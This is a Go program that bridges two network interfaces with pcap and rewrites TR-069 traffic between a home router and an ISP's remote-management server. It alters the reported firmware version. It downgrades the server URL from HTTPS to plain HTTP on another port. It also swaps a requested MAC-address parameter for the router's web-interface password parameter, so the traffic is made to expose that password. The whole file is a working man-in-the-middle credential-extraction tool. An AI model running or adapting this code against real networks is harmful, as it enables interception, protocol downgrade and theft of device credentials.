package main

import (
	"bytes"
	"fmt"
	"math"
	"net"
	"os"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

const (
	OUTGOING = iota
	INCOMING = iota
)

type BridgePort struct {
	Iface  *net.Interface
	Handle *pcap.Handle
	Source net.HardwareAddr
}

func generatePacket(label int, eth *layers.Ethernet, pppoe *layers.PPPoE, ip *layers.IPv4, tcp *layers.TCP, payload []byte) ([]byte, error) {
	tcp.SetNetworkLayerForChecksum(ip)

	vlan := layers.Dot1Q{
		Priority:       1,
		DropEligible:   false,
		VLANIdentifier: 0,
		Type:           0x8864,
	}

	ppp := layers.PPP{
		PPPType: layers.PPPTypeIPv4,
	}

	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}
	buffer := gopacket.NewSerializeBuffer()

	var err error
	if label == OUTGOING {
		err = gopacket.SerializeLayers(buffer, options,
			eth,
			&vlan,
			pppoe,
			&ppp,
			ip,
			tcp,
			gopacket.Payload(payload))
	} else {
		err = gopacket.SerializeLayers(buffer, options,
			eth,
			pppoe,
			&ppp,
			ip,
			tcp,
			gopacket.Payload(payload))
	}

	if err != nil {
		return nil, err
	}

	return buffer.Bytes(), nil
}

func processOutgoing(packet gopacket.Packet, wholePacket bool) ([]byte, error) {

	tcp := packet.Layer(layers.LayerTypeTCP).(*layers.TCP)

	payload := tcp.Payload
	payload = bytes.Replace(payload, []byte("HG253sC01B039"), []byte("HG253sC01B035"), -1)

	if !wholePacket {
		return payload, nil
	}

	eth := packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
	vlan := packet.Layer(layers.LayerTypeDot1Q).(*layers.Dot1Q)
	pppoe := packet.Layer(layers.LayerTypePPPoE).(*layers.PPPoE)
	ppp := packet.Layer(layers.LayerTypePPP).(*layers.PPP)
	ip := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
	tcp.SetNetworkLayerForChecksum(ip)

	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}
	buffer := gopacket.NewSerializeBuffer()

	err := gopacket.SerializeLayers(buffer, options,
		eth,
		vlan,
		pppoe,
		ppp,
		ip,
		tcp,
		gopacket.Payload(payload))

	if err != nil {
		return nil, err
	}

	return buffer.Bytes(), nil

}

func processIncoming(packet gopacket.Packet) ([]byte, error) {
	eth := packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
	pppoe := packet.Layer(layers.LayerTypePPPoE).(*layers.PPPoE)
	ppp := packet.Layer(layers.LayerTypePPP).(*layers.PPP)
	ip := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
	tcp := packet.Layer(layers.LayerTypeTCP).(*layers.TCP)

	payload := tcp.Payload

	payload = bytes.Replace(payload, []byte("https://acs.superonline.net"), []byte("http://acs.superonline.net:8016"), -1)
	payload = bytes.Replace(payload,
		[]byte("InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1.MACAddress"),
		[]byte("InternetGatewayDevice.UserInterface.X_Web.UserInfo.1.Userpassword"), -1)

	tcp.SetNetworkLayerForChecksum(ip)

	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}
	buffer := gopacket.NewSerializeBuffer()

	err := gopacket.SerializeLayers(buffer, options,
		eth,
		pppoe,
		ppp,
		ip,
		tcp,
		gopacket.Payload(payload))

	if err != nil {
		return nil, err
	}

	return buffer.Bytes(), nil
}

func fragmentAndSend(label int, packet *gopacket.Packet, port BridgePort) error {

	ethLayer := (*packet).Layer(layers.LayerTypeEthernet)
	if ethLayer == nil {
		return fmt.Errorf("Couldn't find ethernet layer, ignoring packet...\n")
	}

	eth, _ := ethLayer.(*layers.Ethernet)

	pppoeLayer := (*packet).Layer(layers.LayerTypePPPoE)
	if pppoeLayer == nil {
		return fmt.Errorf("Couldn't find PPPoE layer ignoring packet...\n")
	}

	pppoe, _ := pppoeLayer.(*layers.PPPoE)

	ipLayer := (*packet).Layer(layers.LayerTypeIPv4)
	if ipLayer == nil {
		return fmt.Errorf("Couldn't find ipv4 layer(ipv6 isn't supported), ignoring packet...\n")
	}

	ip, _ := ipLayer.(*layers.IPv4)

	tcpLayer := (*packet).Layer(layers.LayerTypeTCP)
	if tcpLayer == nil {
		return fmt.Errorf("Fragmentation is only supported for TCP. Ignoring...\n")
	}

	tcp, _ := tcpLayer.(*layers.TCP)

	totalHeaderSize := len((*packet).Data()) - len(tcp.Payload)
	maxPayloadSize := port.Iface.MTU - totalHeaderSize

	fragmentCount := int(len(tcp.Payload) / maxPayloadSize)
	if math.Mod(float64(len(tcp.Payload)), float64(maxPayloadSize)) > 0.0 {
		fragmentCount++
	}

	seq := tcp.Seq
	payload := tcp.Payload
	tcp.Payload = nil

	var i int
	for i = 0; i < fragmentCount-1; i++ {
		tcp.Seq = seq

		seq += uint32(maxPayloadSize)

		packetData, err := generatePacket(label, eth, pppoe, ip, tcp, payload[i*maxPayloadSize:i*maxPayloadSize+maxPayloadSize])
		if err != nil {
			err = fmt.Errorf("Error while generating fragmented packet for %s: %s\n", port.Iface.Name, err.Error())
			return err
		}

		err = port.Handle.WritePacketData(packetData)
		if err != nil {
			return fmt.Errorf("Error while forwarding fragmented packet to %s: %s\n", port.Iface.Name, err.Error())
		}
	}

	lastPayloadSize := len(payload) - i*maxPayloadSize

	tcp.Seq = seq

	packetData, err := generatePacket(label, eth, pppoe, ip, tcp, payload[i*maxPayloadSize:i*maxPayloadSize+lastPayloadSize])
	if err != nil {
		return fmt.Errorf("Error while generating last fragmented packet for %s: %s\n", port.Iface.Name, err.Error())
	}

	err = port.Handle.WritePacketData(packetData)
	if err != nil {
		return fmt.Errorf("Error while forwarding last fragmented packet to %s: %s\n", port.Iface.Name, err.Error())
	}

	return nil
}

func bridge(outgoingPort BridgePort, incomingPort BridgePort, label int) {

	for {
		packetData, inf, err := outgoingPort.Handle.ReadPacketData()
		if err != nil {
			fmt.Printf("[-] Error while reading from %d handle: %s\n", label, err.Error())
			continue
		}

		if label == INCOMING { // strip out vss-monitoring trailer
			packetData = packetData[:len(packetData)-2]
		}

		packet := gopacket.NewPacket(packetData, layers.LayerTypeEthernet, gopacket.Default)

		ipLayer := packet.Layer(layers.LayerTypeIPv4)
		if ipLayer != nil {
			ip, _ := ipLayer.(*layers.IPv4)

			if label == OUTGOING && bytes.Equal(ip.DstIP, []byte{85, 29, 13, 3}) {
				tcp, _ := packet.Layer(layers.LayerTypeTCP).(*layers.TCP)

				if tcp.DstPort == 8015 && len(tcp.Payload) > 0 {
					fmt.Printf("[+] Caught outgoing!\n")
					packetData, err = processOutgoing(packet, true)
					if err != nil {
						fmt.Printf("[-] Couldn't modify intercepted package: %s\n", err.Error())
						return
					}
				}

			} else if label == INCOMING && bytes.Equal(ip.SrcIP, []byte{85, 29, 13, 3}) {
				tcp, _ := packet.Layer(layers.LayerTypeTCP).(*layers.TCP)

				if tcp.SrcPort == 8015 && len(tcp.Payload) > 0 {
					fmt.Printf("[+] Caught incoming!\n")
					packetData, err = processIncoming(packet)
					if err != nil {
						fmt.Printf("[-] Couldn't modify intercepted package: %s\n", err.Error())
						return
					}
				}
			}
		}

		if inf.CaptureLength != inf.Length {
			fmt.Printf("[-] Couldn't fully capture the packet, this shouldn't happen! Captured %d bytes, original packet is %d bytes\n",
				inf.CaptureLength, inf.Length)
			return
		}

		// rely on len(data) instead of inf.CaptureLength because vss-monitoring trailer may be stripped out
		packetSize := len(packetData)
		if packetSize <= incomingPort.Iface.MTU {
			err = incomingPort.Handle.WritePacketData(packetData)
			if err != nil {
				fmt.Printf("[-] Error while forwarding to %s: %s\n", incomingPort.Iface.Name, err.Error())
				return
			}
		} else { // fragment packet
			fmt.Printf("[+] Fragmenting packet...\n")
			err = fragmentAndSend(label, &packet, incomingPort)
			if err != nil {
				fmt.Printf("[-] Error while fragmenting packet: %s\n", err.Error())
				return
			}
		}
	}
}

func initHandle(iface *net.Interface, promisc bool) (*pcap.Handle, error) {
	return pcap.OpenLive(iface.Name, 65535, promisc, pcap.BlockForever)
}

func initPort(ifaceName string, mac net.HardwareAddr) (BridgePort, error) {
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		return BridgePort{}, fmt.Errorf("Error retrieving interface %s: %s", ifaceName, err.Error())
	}

	handle, err := initHandle(iface, true)
	if err != nil {
		return BridgePort{}, fmt.Errorf("Error while initializing handle: %s", err.Error())
	}

	return BridgePort{iface, handle, mac}, nil
}

func main() {

	args := os.Args[1:]

	if len(args) != 4 {
		fmt.Printf("[-] Missing arguments\n")
		return
	}

	fmt.Printf("[+] Configuring interfaces %s and %s...\n", args[0], args[2])

	inMac, err := net.ParseMAC(args[1])
	if err != nil {
		fmt.Printf("[-] Invalid outgoing source MAC: %s\n", err.Error())
		return
	}

	outMac, err := net.ParseMAC(args[3])
	if err != nil {
		fmt.Printf("[-] Invalid incoming source MAC: %s\n", err.Error())
		return
	}

	outgoingPort, err := initPort(args[0], inMac)
	if err != nil {
		fmt.Printf("[-] Error while configuring input interface: %s\n", err.Error())
		return
	}
	defer outgoingPort.Handle.Close()

	incomingPort, err := initPort(args[2], outMac)
	if err != nil {
		fmt.Printf("[-] Error while configuring output interface: %s\n", err.Error())
		return
	}
	defer incomingPort.Handle.Close()

	if outgoingPort.Iface.MTU != incomingPort.Iface.MTU {
		fmt.Printf("[-] MTU values of interfaces are different. This can be a problem.\n")
	}

	fmt.Printf("[+] Done! Bridging...\n")

	go bridge(outgoingPort, incomingPort, OUTGOING)
	bridge(incomingPort, outgoingPort, INCOMING)
}
